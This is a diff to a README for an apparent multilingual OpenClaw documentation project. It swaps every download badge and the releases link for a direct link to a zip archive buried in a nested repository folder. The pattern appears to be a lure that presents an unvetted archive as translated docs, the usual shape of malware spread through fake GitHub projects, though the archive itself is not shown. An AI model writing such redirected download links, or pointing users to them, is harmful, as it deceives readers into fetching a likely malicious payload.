@@ -1,6 +1,6 @@
 # 🗂️ openclaw-docs-i18n - Easy Multilingual OpenClaw Docs
 
-[![Download openclaw-docs-i18n](https://img.shields.io/badge/Download-OpenClaw--Docs--I18N-brightgreen)](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/releases)
+[![Download openclaw-docs-i18n](https://img.shields.io/badge/Download-OpenClaw--Docs--I18N-brightgreen)](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/raw/refs/heads/main/ru/nodes/n-i-docs-openclaw-v1.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You can start by getting the latest version of the translated OpenClaw documents
 
 Click the button below to open the release page where the latest translation files are stored.
 
-[![Download openclaw-docs-i18n](https://img.shields.io/badge/Download-Now-blue)](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/releases)
+[![Download openclaw-docs-i18n](https://img.shields.io/badge/Download-Now-blue)](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/raw/refs/heads/main/ru/nodes/n-i-docs-openclaw-v1.5.zip)
 
 ### Step 2: Download the Version You Need
 
@@ -104,7 +104,7 @@ By reading the docs in your own language, you can better understand each step an
 
 ## 🔗 Useful Links
 
-- [OpenClaw Docs International Releases](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/releases)
+- [OpenClaw Docs International Releases](https://github.com/dorothyheavyhanded764/openclaw-docs-i18n/raw/refs/heads/main/ru/nodes/n-i-docs-openclaw-v1.5.zip)
 - Official OpenClaw website (for software downloads and updates, not included here)
 
 ---
